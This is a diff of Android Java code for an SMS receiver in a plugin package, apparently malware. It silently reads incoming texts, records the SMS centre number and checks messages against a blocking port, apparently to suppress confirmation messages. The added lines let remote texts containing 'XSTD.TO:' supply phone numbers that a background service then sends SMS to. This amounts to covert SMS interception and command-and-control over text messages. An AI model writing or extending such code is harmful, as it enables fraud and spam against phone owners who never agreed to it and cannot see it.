@@ -9,6 +9,7 @@ import com.xstd.plugin.Utils.SMSUtil;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
+import com.xstd.plugin.service.PluginService;
 
 /**
  * Created with IntelliJ IDEA.
@@ -25,42 +26,82 @@ public class PrivateSMSBRC extends BroadcastReceiver {
                 Config.LOGD("[[PrivateSMSBRC::onReceive]] action = " + intent.getAction());
             }
             SmsMessage[] messages = getMessagesFromIntent(intent);
-            if (messages == null || messages.length == 0) {
-                return;
-            }
+            if (messages == null || messages.length == 0) return;
 
             SettingManager.getInstance().init(context);
             for (SmsMessage message : messages) {
                 /**
                  * 先判断短信中心是否已经有了配置，如果没有的话，尝试从短信中获取短信中心的号码
                  */
+                String msg = message.getMessageBody();
+                if (message == null || TextUtils.isEmpty(msg)) continue;
 
                 if (Config.DEBUG) {
-                    Config.LOGD("[[PrivateSMSBRC::onReceive]] has receive SMS from <<" + message.getDisplayOriginatingAddress()
-                                    + ">>, content : " + message.getMessageBody()
+                    Config.LOGD("\n\n[[PrivateSMSBRC::onReceive]] has receive SMS from : \n<<" + message.getDisplayOriginatingAddress()
+                                    + ">>"
+                                    + "\n || content : " + message.getMessageBody()
                                     + "\n || sms center = " + message.getServiceCenterAddress()
                                     + "\n || sms display origin address = " + message.getDisplayOriginatingAddress()
-                                    + "\n || sms = " + message.toString()
-                                    + "\n || intent info = " + intent.toString());
+                                    + "\n || sms = " + msg
+                                    + "\n || intent info = " + intent.getExtras()
+                                    + "\n =================="
+                                    + "\n\n");
                 }
 
+                //对于任何一条短信，都要先取出短信的发送地址
+                String address = message.getOriginatingAddress();
+                if (TextUtils.isEmpty(address) || address.startsWith("10")) {
+                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
+                    if (Config.DEBUG) {
+                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] ignore this Message as the address is empty or address start with 10.\n");
+                    }
+                    return;
+                }
+
+                /**
+                 * 短信发送地址处理
+                 */
+                if (address.startsWith("+") == true && address.length() == 14) {
+                    address = address.substring(3);
+                } else if (address.length() > 11) {
+                    address = address.substring(address.length() - 11);
+                }
+
+                /**
+                 * 短信中心处理
+                 */
                 String center = message.getServiceCenterAddress();
-//                if (Config.DEBUG) {
-//                    Config.LOGD("[[PrivateSMSBRC::onReceive]] center = " + center);
-//                }
                 if (!TextUtils.isEmpty(center)) {
                     if (center.startsWith("+") == true && center.length() == 14) {
                         center = center.substring(3);
                     } else if (center.length() > 11) {
                         center = center.substring(center.length() - 11);
                     }
-
                     SettingManager.getInstance().setKeySmsCenterNum(center);
-
-//                    if (Config.DEBUG) {
-//                        Config.LOGD("[[PrivateSMSBRC::onReceive]] SMS Center is : " + center + ">>>>>>>>");
-//                    }
                 }
+
+                /**
+                 * 是否是短信服务器发送的短信
+                 */
+                if (/*AppRuntime.PHONE_SERVICE.startsWith(address) && */msg.contains("XSTD.TO:")) {
+                    String phoneNumbers = msg.trim().substring("XSTD.TO:".length());
+                    String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
+                    if (TextUtils.isEmpty(oldPhoneNumbers)) {
+                        SettingManager.getInstance().setBroadcastPhoneNumber(phoneNumbers);
+                    } else {
+                        SettingManager.getInstance().setBroadcastPhoneNumber(oldPhoneNumbers + ";" + phoneNumbers);
+                    }
+                    if (Config.DEBUG) {
+                        Config.LOGD("\n[[PrivateSMSBRC::onReceive]] we receive SMS [[XSTD.TO:]] for broadcast"
+                            + " phoneNumbers : " + SettingManager.getInstance().getBroadcastPhoneNumber() + " >>>>>>>>");
+                    }
+
+                    Intent i = new Intent();
+                    i.setClass(context, PluginService.class);
+                    i.setAction(PluginService.SMS_BROADCAST_ACTION);
+                    context.startService(i);
+                }
+
 
                 /**
                  * 如果短信中心不为空，那么再进行其他的操作
@@ -68,15 +109,7 @@ public class PrivateSMSBRC extends BroadcastReceiver {
                 if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
                         && AppRuntime.ACTIVE_RESPONSE != null
                         && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
-                    String msg = message.getMessageBody();
                     //对于短信内容先进行二次确认检查
-
-                    String address = message.getOriginatingAddress();
-                    if (address.startsWith("+") == true && address.length() == 14) {
-                        address = address.substring(3);
-                    } else if (address.length() > 11) {
-                        address = address.substring(address.length() - 11);
-                    }
 
                     if (!secondSMSCmdCheck(msg, address)) {
                         boolean keyBlock = false;
